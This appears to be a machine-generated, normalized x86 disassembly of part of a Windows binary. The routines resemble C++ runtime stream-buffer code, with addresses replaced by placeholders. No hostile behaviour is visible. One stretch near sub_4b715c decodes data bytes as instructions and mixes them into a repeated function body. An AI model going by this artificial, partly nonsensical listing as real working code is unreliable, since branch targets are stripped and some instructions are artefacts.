mov [ ebp - 0x5e0 ] ecx
cmp [ ebp - 0x248 ] 0x10
jb r-xdata
mov eax [ ebp - 0x548 ]
mov [ ebp - 0x1a0 ] eax
add ecx eax
mov [ ebp - 0x550 ] ecx
mov edx [ ebp - 0x550 ]
mov cl [ ebp - 0x549 ]
mov [ edx ] cl
lea eax [ ebp - 0x1b0 ]
mov eax [ ebp - 0x1b0 ]
jmp r-xdata
mov [ ebp - 0x500 ] eax
mov edx [ ebp - 0x4f8 ]
push edx
mov ecx [ ebp - 0x4fc ]
push ecx
mov eax [ ebp - 0x500 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebp - 0x1a0 ]
sub edx [ ebp - 0x4f4 ]
mov [ ebp - 0x504 ] edx
mov ecx [ ebp - 0x504 ]
mov [ ebp - 0x508 ] ecx
mov [ ebp - 0x509 ] 0x0
cmp [ ebp - 0x19c ] 0x10
jb r-xdata
mov eax [ ebp - 0x62c ]
mov [ ebp - 0x24c ] eax
add ecx eax
mov [ ebp - 0x634 ] ecx
mov edx [ ebp - 0x634 ]
mov cl [ ebp - 0x62d ]
mov [ edx ] cl
lea eax [ ebp - 0x25c ]
mov eax [ ebp - 0x25c ]
jmp r-xdata
mov [ ebp - 0x5e4 ] eax
mov edx [ ebp - 0x5dc ]
push edx
mov ecx [ ebp - 0x5e0 ]
push ecx
mov eax [ ebp - 0x5e4 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebp - 0x24c ]
sub edx [ ebp - 0x5d8 ]
mov [ ebp - 0x5e8 ] edx
mov ecx [ ebp - 0x5e8 ]
mov [ ebp - 0x5ec ] ecx
mov [ ebp - 0x5ed ] 0x0
cmp [ ebp - 0x248 ] 0x10
jb r-xdata
mov edx [ ebp - 0x508 ]
mov [ ebp - 0x1a0 ] edx
add eax edx
mov [ ebp - 0x510 ] eax
mov eax [ ebp - 0x510 ]
mov cl [ ebp - 0x509 ]
mov [ eax ] cl
jmp r-xdata
mov edx [ ebp - 0x5ec ]
mov [ ebp - 0x24c ] edx
add eax edx
mov [ ebp - 0x5f4 ] eax
mov eax [ ebp - 0x5f4 ]
mov cl [ ebp - 0x5ed ]
mov [ eax ] cl
jmp r-xdata
sub_4b64e8
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x1
sete dl
mov eax [ ebp + 0x8 ]
and edx 0x1
mov [ eax + 0x4c ] dl
lea ecx [ eax + 0xc ]
mov [ eax + 0x45 ] 0x0
mov [ eax + 0x14 ] ecx
lea edx [ eax + 0x10 ]
mov [ eax + 0x18 ] edx
lea ecx [ eax + 0x1c ]
mov [ eax + 0x24 ] ecx
lea edx [ eax + 0x20 ]
mov [ eax + 0x28 ] edx
lea ecx [ eax + 0x2c ]
mov [ eax + 0x34 ] ecx
lea edx [ eax + 0x30 ]
mov [ eax + 0x38 ] edx
xor edx edx
mov ecx [ eax + 0x18 ]
mov [ ecx ] edx
xor edx edx
mov ecx [ eax + 0x28 ]
mov [ ecx ] edx
xor edx edx
mov ecx [ eax + 0x38 ]
mov [ ecx ] edx
xor edx edx
mov ecx [ eax + 0x14 ]
mov [ ecx ] edx
xor edx edx
mov ecx [ eax + 0x24 ]
mov [ ecx ] edx
xor edx edx
mov ecx [ eax + 0x34 ]
mov [ ecx ] edx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x50 ] ecx
xor ecx ecx
mov edx [ rw-data ]
mov [ eax + 0x48 ] edx
mov [ eax + 0x40 ] ecx
pop ebp
retn
sub_4b65f4
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov eax rw-data
call sub_4c517c
push esi
mov esi rw-data
lea edi [ ebp - 0x34 ]
mov ecx 0x4
[ edi ] [ esi ]
pop esi
mov eax [ ebx + 0x58 ]
mov [ ebp - 0x34 ] eax
mov edx [ ebx + 0x5c ]
mov [ ebp - 0x30 ] edx
mov [ ebp - 0x14 ] 0xc
call sub_4c37dc
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0x1
push esi
mov edi esi
lea esi [ ebp - 0x34 ]
mov ecx 0x4
[ edi ] [ esi ]
pop esi
mov eax esi
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4b6750
push ebp
mov ebp esp
add esp 0xffffffc0
mov eax rw-data
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
call sub_4c517c
test esi esi
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] 0xc
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x4 ]
cmp eax 0x1
je r-xdata
push eax
call sub_4c3b24
pop ecx
cmp eax 0x3
jne r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
inc [ ebp - 0xc ]
mov [ ebp - 0x18 ] 0x18
dec [ rw-data ]
jne r-xdata
push eax
call sub_4c3b58
pop ecx
cmp eax 0x3
jne r-xdata
dec [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
cmp eax 0x1
je r-xdata
test [ ebp + 0xc ] 0x1
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ ebp - 0x2c ] edx
test [ eax + 0x10 ] 0x6
jne r-xdata
mov [ ebp - 0x18 ] 0x0
test bl bl
je r-xdata
push esi
call sub_4b0180
pop ecx
mov edi [ ebp - 0x2c ]
mov ebx [ rw-data ]
test edi edi
je r-xdata
mov edx [ eax + 0x30 ]
push edx
mov ecx [ edx ]
call [ ecx + 0x34 ]
pop ecx
inc eax
jne r-xdata
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ rw-data ]
test [ eax + 0x10 ] 0x6
jne r-xdata
mov eax [ ebx + 0x10 ]
or eax edi
mov [ ebp - 0x30 ] eax
push 0x0
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x2c ]
or eax 0x4
mov [ ebp - 0x2c ] eax
mov edi [ ebp - 0x34 ]
mov ebx [ rw-data ]
test edi edi
je r-xdata
mov edx [ eax + 0x30 ]
push edx
mov ecx [ edx ]
call [ ecx + 0x34 ]
pop ecx
inc eax
jne r-xdata
mov edx [ ebp - 0x30 ]
mov edx [ ebp - 0x30 ]
or edx 0x4
jmp r-xdata
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax [ rw-data ]
test [ eax + 0x10 ] 0x6
jne r-xdata
mov eax [ ebx + 0x10 ]
or eax edi
mov [ ebp - 0x38 ] eax
push 0x0
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x34 ]
or eax 0x4
mov [ ebp - 0x34 ] eax
push edx
push ebx
call sub_4b02b0
add esp 0xc
mov edi [ ebp - 0x3c ]
mov ebx [ rw-data ]
test edi edi
je r-xdata
mov edx [ eax + 0x30 ]
push edx
mov ecx [ edx ]
call [ ecx + 0x34 ]
pop ecx
inc eax
jne r-xdata
mov edx [ ebp - 0x38 ]
mov edx [ ebp - 0x38 ]
or edx 0x4
jmp r-xdata
mov eax [ ebx + 0x10 ]
or eax edi
mov [ ebp - 0x40 ] eax
push 0x0
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
or eax 0x4
mov [ ebp - 0x3c ] eax
push edx
push ebx
call sub_4b02b0
add esp 0xc
mov edx [ ebp - 0x40 ]
mov edx [ ebp - 0x40 ]
or edx 0x4
jmp r-xdata
push edx
push ebx
call sub_4b02b0
add esp 0xc
sub_4b6afc
push ebp
mov ebp esp
add esp 0xfffffecc
mov eax rw-data
push ebx
push esi
push edi
lea ebx [ ebp - 0x28 ]
mov esi [ ebp + 0x8 ]
call sub_4c517c
cmp [ esi + 0x40 ] 0x0
je r-xdata
mov al 0x1
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
cmp [ esi + 0x45 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x50 ] 0x8
push 0xffffffff
push esi
mov ecx [ esi ]
call [ ecx + 0xc ]
add esp 0x8
mov edi eax
mov [ ebp - 0x58 ] 0xffffffff
cmp edi [ ebp - 0x58 ]
sete al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x3c ] 0xc
lea ecx [ ebp - 0x60 ]
push ecx
call sub_408628
pop ecx
lea eax [ ebp - 0x60 ]
push eax
lea edx [ ebx + 0x8 ]
push edx
call sub_408650
add esp 0x8
mov ecx 0xf
mov [ ebx + 0x24 ] ecx
xor eax eax
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
xor eax eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov edx edi
dec edx
mov edx 0x1
jmp r-xdata
xor ecx ecx
mov [ ebx + 0x20 ] ecx
add edx ecx
mov [ edx ] al
lea eax [ ebx + 0x8 ]
push eax
call sub_408880
pop ecx
mov edi eax
cmp edi 0x1
ja r-xdata
cmp [ ebx + 0x24 ] 0x8
jae r-xdata
push ebx
call sub_4bbca8
pop ecx
cmp edx 0x8
jae r-xdata
mov cl 0x1
test cl cl
je r-xdata
mov eax [ ebx + 0x20 ]
push eax
push 0x8
push ebx
call sub_408678
add esp 0xc
inc [ ebp - 0x30 ]
mov [ ebp - 0x3c ] 0x18
mov [ ebp - 0x61 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea edi [ ebx + 0x10 ]
mov edi [ ebx + 0x10 ]
jmp r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0xfc ] edi
mov eax [ ebp - 0xfc ]
add eax [ ebx + 0x20 ]
mov [ ebp - 0x74 ] eax
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0x68 ] eax
push 0x8
movsx edx [ ebp - 0x61 ]
push edx
mov ecx [ ebp - 0x68 ]
push ecx
call sub_4c4d44
add esp 0xc
mov [ ebp - 0x69 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov [ esi + 0x45 ] 0x0
je r-xdata
mov [ ebp - 0x78 ] edx
lea edx [ ebp - 0x54 ]
mov eax [ ebp - 0x78 ]
mov [ ebp - 0x10c ] eax
lea eax [ esi + 0x48 ]
mov ecx [ ebp - 0x10c ]
mov [ ebp - 0x7c ] ecx
mov [ ebp - 0x80 ] eax
push edx
mov ecx [ ebp - 0x74 ]
push ecx
mov eax [ ebp - 0x7c ]
push eax
mov edx [ ebp - 0x80 ]
push edx
mov ecx [ esi + 0x40 ]
push ecx
mov eax [ ecx ]
call [ eax + 0x18 ]
add esp 0x14
sub eax 0x1
jb r-xdata
mov edx 0x8
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x70 ] eax
mov eax [ ebp - 0x70 ]
mov cl [ ebp - 0x69 ]
mov [ eax ] cl
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
sub eax 0x2
je r-xdata
cmp [ esi + 0x45 ] 0x0
jne r-xdata
mov eax [ esi + 0x50 ]
push eax
push edi
push 0x1
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx eax
mov [ ebp - 0x11c ] edx
mov edi [ ebp - 0x54 ]
sub edi edx
mov [ ebp - 0x3c ] 0x18
test edi edi
jbe r-xdata
mov al 0x1
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
jmp r-xdata
test edi edi
jne r-xdata
mov al 0x1
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0xe5 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov esi [ ebx + 0x10 ]
mov edi esi
push edi
call sub_4b0180
pop ecx
xor eax eax
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
or ecx 0xffffffff
sub ecx [ ebx + 0x20 ]
cmp ecx 0x8
ja r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0x9d ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x10 ]
mov [ ebp - 0x98 ] edx
mov ecx [ ebp - 0x98 ]
mov [ ebp - 0x9c ] ecx
mov eax [ ebp - 0x9c ]
push eax
call sub_4b0180
pop ecx
xor eax eax
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov [ ebp - 0x84 ] edx
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
push ecx
call sub_4c6cac
add esp 0x10
cmp edi eax
je r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0xed ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov esi [ ebx + 0x10 ]
mov edi esi
push edi
call sub_4b0180
pop ecx
mov eax [ ebx + 0x20 ]
lea edx [ ebx + 0x8 ]
add eax 0x8
mov [ ebp - 0xa8 ] eax
push edx
mov edi eax
call sub_408880
pop ecx
mov [ ebp - 0xac ] eax
cmp [ ebp - 0xac ] 0x1
ja r-xdata
push ebx
call sub_4bbca8
pop ecx
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0x8d ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x10 ]
mov [ ebp - 0x88 ] edx
mov ecx [ ebp - 0x88 ]
mov [ ebp - 0x8c ] ecx
mov eax [ ebp - 0x8c ]
push eax
call sub_4b0180
pop ecx
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0xec ] ecx
mov edx [ ebp - 0xec ]
mov cl [ ebp - 0xe5 ]
mov [ edx ] cl
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0xac ]
dec ecx
mov ecx 0x1
jmp r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0xa4 ] ecx
mov edx [ ebp - 0xa4 ]
mov cl [ ebp - 0x9d ]
mov [ edx ] cl
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0xf4 ] ecx
mov edx [ ebp - 0xf4 ]
mov cl [ ebp - 0xed ]
mov [ edx ] cl
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
cmp edi [ ebx + 0x24 ]
jbe r-xdata
push ebx
call sub_4bbca8
pop ecx
cmp edi ecx
jbe r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0x94 ] ecx
mov edx [ ebp - 0x94 ]
mov cl [ ebp - 0x8d ]
mov [ edx ] cl
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
test edi edi
jne r-xdata
mov eax [ ebx + 0x20 ]
push eax
push edi
push ebx
call sub_408678
add esp 0xc
jmp r-xdata
test edi edi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0xc5 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov [ ebp - 0xcd ] 0x0
mov edx [ ebx + 0x20 ]
mov [ ebp - 0xd4 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0xcc ] eax
mov eax [ ebp - 0xcc ]
mov cl [ ebp - 0xc5 ]
mov [ eax ] cl
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
add ecx [ ebp - 0xd4 ]
mov [ ebp - 0xd8 ] ecx
push 0x8
movsx eax [ ebp - 0xcd ]
push eax
mov edx [ ebp - 0xd8 ]
push edx
call sub_4c4d44
add esp 0xc
mov eax [ ebp - 0xa8 ]
mov [ ebp - 0xdc ] eax
mov [ ebp - 0xdd ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov eax [ ebp - 0xdc ]
mov [ ebx + 0x20 ] eax
add edx eax
mov [ ebp - 0xe4 ] edx
mov edx [ ebp - 0xe4 ]
mov cl [ ebp - 0xdd ]
mov [ edx ] cl
jmp r-xdata
sub_4b70e0
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0xc ]
call sub_4c517c
mov [ ebp - 0x8 ] 0x2
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0xc
mov ecx [ ebp + 0x8 ]
mov edx rw-data
mov eax rw-data
test bl 0x2
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov ecx [ edx ]
mov [ ecx + 0x8 ] eax
je r-xdata
test bl 0x1
je r-xdata
dec [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0x8
dec [ ebp - 0x8 ]
push 0x0
push eax
call sub_4b3018
add esp 0x8
mov edx [ ebp + 0x8 ]
push edx
call sub_4b0180
pop ecx
sub_4b715c
inc eax
add [ eax ] al
add [ ebx ] al
add [ eax ] dh
add [ eax ] cl
add [ eax ] al
add [ edi ] dh
add [ eax ] al
pushad
add [ eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
add al [ eax ]
add [ eax ] al
jbe r-xdata
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0xc ]
call sub_4c517c
mov [ ebp - 0x8 ] 0x2
cmp [ ebp + 0x8 ] 0x0
add [ ecx ] al
add [ eax + eax + 0x73 ] dh
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0xc
mov ecx [ ebp + 0x8 ]
mov edx rw-data
mov eax rw-data
test bl 0x2
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov ecx [ edx ]
mov [ ecx + 0x8 ] eax
je r-xdata
cmp bh [ edx ]
bound esp [ ecx + 0x73 ]
imul esp [ ebx + 0x5f ] 0x3c736f69
arpl [ eax + 0x61 ] bp
jb r-xdata
test bl 0x1
je r-xdata
dec [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4b0180
pop ecx
je r-xdata
cmp bh [ fs : edx ]
arpl [ eax + 0x61 ] bp
jb r-xdata
retn
je r-xdata
add eax 0x10
dec [ ebp - 0x8 ]
push 0x0
push eax
call sub_4b3018
add esp 0x8
popad
imul esi [ ebx + esi * 2 + 0x3c ] 0x72616863
and [ esi ] bh
add [ eax ] al
add [ eax ] al
hlt
sub_4b7250
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
call sub_4c517c
mov [ ebp - 0x8 ] 0x1
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0xc
mov edx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
dec [ ebp - 0x8 ]
mov ecx rw-data
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
push 0x3
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x3c ]
push ecx
call sub_4b2f24
add esp 0x8
test [ ebp + 0xc ] 0x1
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x50 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4b0180
pop ecx
push 0x2
push 0x0
mov edx [ ebp + 0x8 ]
push edx
call sub_4b64e8
add esp 0xc
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4b6afc
pop ecx
test al al
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x50 ]
push ecx
call sub_4c6870
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ebx eax
xor eax eax
mov ebx eax
sub_4b74cc
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
call sub_4c517c
mov [ ebp - 0x8 ] 0x2
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0xc
mov edx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ ebp + 0x8 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jle r-xdata
test ebx ebx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x10 ]
push edx
call sub_4c429c
pop ecx
jmp r-xdata
dec [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
test [ ebp + 0xc ] 0x1
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push eax
call sub_4b0158
pop ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4b0180
pop ecx
sub_4b754c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
lea esi [ ebx + 0x8 ]
movzx edi [ ebp + 0xc ]
mov eax [ esi ]
push eax
and edi 0xff
push edi
call sub_4cbff4
add esp 0x8
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4b7574
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
cmp ebx [ ebp + 0x10 ]
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
add esi 0x8
movzx edi [ ebx ]
mov eax [ esi ]
push eax
and edi 0xff
push edi
call sub_4cbff4
add esp 0x8
mov [ ebx ] al
inc ebx
cmp ebx [ ebp + 0x10 ]
jne r-xdata
sub_4b75ac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
lea esi [ ebx + 0x8 ]
movzx edi [ ebp + 0xc ]
mov eax [ esi ]
push eax
and edi 0xff
push edi
call sub_4cc098
add esp 0x8
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4b75d4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
cmp ebx [ ebp + 0x10 ]
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
add esi 0x8
movzx edi [ ebx ]
mov eax [ esi ]
push eax
and edi 0xff
push edi
call sub_4cc098
add esp 0x8
mov [ ebx ] al
inc ebx
cmp ebx [ ebp + 0x10 ]
jne r-xdata
sub_4b7614
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov edx ebx
sub edx eax
push edx
push eax
mov eax [ ebp + 0x14 ]
push eax
call sub_4c4cb0
add esp 0xc
mov eax ebx
pop ebx
pop ebp
retn
sub_4b7640
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov edx ebx
sub edx eax
push edx
push eax
mov eax [ ebp + 0x18 ]
push eax
call sub_4c4cb0
add esp 0xc
mov eax ebx
pop ebx
pop ebp
retn
sub_4b7664
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x8 ] 0x1
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0xc
mov edx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] edx
dec [ ebp - 0x8 ]
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_4b3018
add esp 0x8
test [ ebp + 0xc ] 0x1
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4b0180
pop ecx
sub_4b76d0
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
test ebx ebx
je r-xdata
mov eax [ ebp - 0x24 ]
mov [ fs : 0x0 ] eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx rw-data
mov [ ebx ] edx
push 0x3
mov ecx [ ebx + 0x3c ]
push ecx
call sub_4b2f24
add esp 0x8
test [ ebp + 0xc ] 0x1
je r-xdata
push ebx
call sub_4b0180
pop ecx
sub_4b7748
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebx ]
call [ eax + 0x18 ]
mov esi eax
mov edi 0xffffffff
cmp esi edi
pop ecx
sete dl
and edx 0x1
test dl dl
je r-xdata
mov edx [ ebx + 0x24 ]
mov ecx [ edx ]
inc [ edx ]
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4b7788
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebx + 0x24 ]
cmp [ edx ] 0x0
je r-xdata
xor esi esi
mov ecx [ ebx + 0x34 ]
mov eax [ ebx + 0x24 ]
mov esi [ ecx ]
sub esi [ eax ]
jmp r-xdata
push ebx
mov ecx [ ebx ]
call [ ecx + 0x1c ]
pop ecx
mov esi eax
mov [ ebp - 0xc ] 0xffffffff
cmp esi [ ebp - 0xc ]
sete al
and eax 0x1
test al al
jne r-xdata
cmp esi edi
jle r-xdata
test esi esi
jle r-xdata
mov edx esi
mov ecx [ ebp + 0xc ]
mov [ ecx ] dl
inc [ ebp + 0xc ]
inc [ ebp - 0x4 ]
dec edi
mov eax esi
mov edx [ ebx + 0x24 ]
mov edx [ edx ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ecx
push eax
push edx
mov eax [ ebp - 0x8 ]
push eax
call sub_4c4cb0
add esp 0xc
add [ ebp + 0xc ] esi
add [ ebp - 0x4 ] esi
sub edi esi
mov eax esi
mov edx [ ebx + 0x24 ]
add [ edx ] eax
jmp r-xdata
mov esi edi
test edi edi
jg r-xdata
sub_4b7828
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebx + 0x28 ]
cmp [ edx ] 0x0
je r-xdata
xor esi esi
mov ecx [ ebx + 0x38 ]
mov eax [ ebx + 0x28 ]
mov esi [ ecx ]
sub esi [ eax ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
mov al [ ecx ]
push eax
push ebx
mov edx [ ebx ]
call [ edx + 0xc ]
add esp 0x8
mov esi eax
mov [ ebp - 0xc ] 0xffffffff
cmp esi [ ebp - 0xc ]
sete cl
and ecx 0x1
test cl cl
jne r-xdata
cmp esi edi
jle r-xdata
test esi esi
jle r-xdata
inc [ ebp + 0xc ]
inc [ ebp - 0x4 ]
dec edi
mov ecx [ ebx + 0x28 ]
mov edx [ ebp + 0xc ]
mov eax esi
mov ecx [ ecx ]
mov [ ebp - 0x8 ] ecx
push eax
push edx
mov eax [ ebp - 0x8 ]
push eax
call sub_4c4cb0
add esp 0xc
add [ ebp + 0xc ] esi
add [ ebp - 0x4 ] esi
sub edi esi
mov eax esi
mov edx [ ebx + 0x28 ]
add [ edx ] eax
jmp r-xdata
mov esi edi
test edi edi
jg r-xdata
sub_4b78c8
push ebp
mov ebp esp
mov eax [ rw-data ]
add esp 0xfffffff8
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
